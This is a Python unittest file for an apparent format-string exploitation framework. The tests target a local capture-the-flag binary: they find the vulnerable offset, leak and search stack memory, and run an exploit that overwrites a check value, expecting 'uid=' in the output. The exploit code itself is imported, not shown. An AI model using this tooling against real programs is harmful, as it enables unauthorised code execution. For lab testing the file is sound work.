import unittest
import sys
import os
from io import StringIO
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../src')))

from dispatcher import Dispatcher
from exploit.string_bug import FormatStringExploit
from tools.pattern_tools import extract_tokens

"""
mode: binary
binary: target/string_bug/ch14
type_input: arg
"""

class TestBinaryNoneStackAlignment(unittest.TestCase):
    def setUp(self):
        self.config = {
            'mode': 'binary',
            'binary': 'target/string_bug/ch14',
            'process_interactive': False,
            'receive_payload_template': "check at {__IGNORE__}\nargv[1] = [{__IGNORE__}]\nfmt=[{__EXTRACT__}]\ncheck={__IGNORE__}\n",
            'type_input': 'arg',
            'verbose': False,
            'ASLR': False
            }
        self.dispatcher = Dispatcher(self.config)

        self.exploit = FormatStringExploit(self.config, self.dispatcher)

    def FindOffsetTest(self):
        """
        Test to find the offset of the format string vulnerability.
        """
        offset, stack_alignment = self.exploit.find_offset(max_offset=100, delay_between_request=0, connect_and_close=False, retry_on_error=True)
        self.assertEqual(offset, 9, "Offset should be 9")
        self.assertEqual(stack_alignment, 0, "Stack alignment should be 0")
    
    def GetStackAddresses(self):
        """
        Test to get the stack addresses.
        """
        stack_addresses = self.exploit.return_stack_addresses(max_length=100, delay_between_request=0, connect_and_close=False, retry_on_error=True)
        self.assertIsInstance(stack_addresses, list, "Stack addresses should be a list")
        self.assertGreater(len(stack_addresses), 1, "Number of stack addresses should be greater than 1")

    def GetStackAddressesRange(self):
        """
        Test to get the stack addresses.
        """

        stack_addresses = self.exploit.return_stack_addresses(
            filter_addresses=[(0xff000000, 0xffffffff)],
            max_length=100,
            delay_between_request=0,
            connect_and_close=False,
            retry_on_error=True
        )
        self.assertIsInstance(stack_addresses, list, "Stack addresses should be a list")
        self.assertGreater(len(stack_addresses), 1, "Number of stack addresses should be greater than 1")
    
    def GetStackAddressesDoubleRange(self):
        """
        Test to get the stack addresses with a double range.
        """

        stack_addresses = self.exploit.return_stack_addresses(
            filter_addresses=
                [
                    (0xff000000, 0xffffffff),
                    (0x08040000, 0x0804f000)
                ],
            max_length=100,
            delay_between_request=0,
            connect_and_close=False,
            retry_on_error=True
        )
        self.assertIsInstance(stack_addresses, list, "Stack addresses should be a list")
        self.assertGreater(len(stack_addresses), 1, "Number of stack addresses should be greater than 1")

    def PrintStackAddresses(self):
        """
        Test to print the stack addresses.
        """

        # Redirect stdout to capture the output
        captured_output = StringIO()
        sys.stdout = captured_output

        self.exploit.print_stack_strings(
            max_length=100,
            delay_between_request=0,
            connect_and_close=False,
            retry_on_error=True
        )
        # Reset stdout
        sys.stdout = sys.__stdout__

        # Get the output
        output = captured_output.getvalue()

        self.assertIn("0x", output, "Output should contain stack addresses starting with '0x'")
        
    def PrintAsciiStackAddresses(self):
        """
        Test to print the stack addresses.
        """

        # Redirect stdout to capture the output
        captured_output = StringIO()
        sys.stdout = captured_output

        self.exploit.print_stack_strings(
            print_ascii=True,
            max_length=100,
            delay_between_request=0,
            connect_and_close=False,
            retry_on_error=True
        )

        # Reset stdout
        sys.stdout = sys.__stdout__
        
        # Get the output
        output = captured_output.getvalue()

        self.assertIn("target/string_bug/ch14", output, "Output should contain the string 'target/string_bug/ch14'")

    def FindStringInStack(self):
        """
        Test to find a string in the stack.
        """

        found_addresses = self.exploit.find_pattern_in_stack(
            pattern_to_find="target/string_bug/ch14",
            max_length=100,
            delay_between_request=0,
            connect_and_close=False,
            retry_on_error=True
        )
        self.assertIsInstance(found_addresses, list, "Found addresses should be a list")
        self.assertGreater(len(found_addresses), 0, "Should find at least one address containing the string 'target/string_bug/ch14'")

    def FindNotPresentStringInStack(self):
        """
        Test to find a string that is not present in the stack.
        """
        
        found_addresses = self.exploit.find_pattern_in_stack(
            pattern_to_find="not_present_string",
            max_length=100,
            delay_between_request=0,
            connect_and_close=False,
            retry_on_error=True
        )
        self.assertEqual(found_addresses, [], "Should not find any address containing the string 'not_present_string'")

    def Resolution(self):
        """
        Test to resolve the addresses in the stack.
        """
        
        self.exploit.find_offset(max_offset=100, delay_between_request=0, connect_and_close=False, retry_on_error=True)

        self.exploit.dispatcher.send_command(b'A' * 
                                             len(self.exploit.return_payload(
                                                 address_overwrite=0xffffcda8,
                                                 address_wanted=0xdeadbeef
                                                 )))
        response = self.exploit.dispatcher.receive_response(disable_template=True)
        check_address = extract_tokens(b"check at {__EXTRACT__}\nargv[1] = [{__IGNORE__}]\nfmt=[{__IGNORE__}]\ncheck={__IGNORE__}\n", response)
        response = self.exploit.classic_exploit(
            address_overwrite=int(check_address['__EXTRACT__'], 16),
            address_wanted=0xdeadbeef,
            win_str="Yeah dude ! You win !\n",
            interactive=False,
        )
        
        self.assertIn(b'uid=', response, "Response should contain 'uid='")
        

if __name__ == "__main__":
    unittest.main()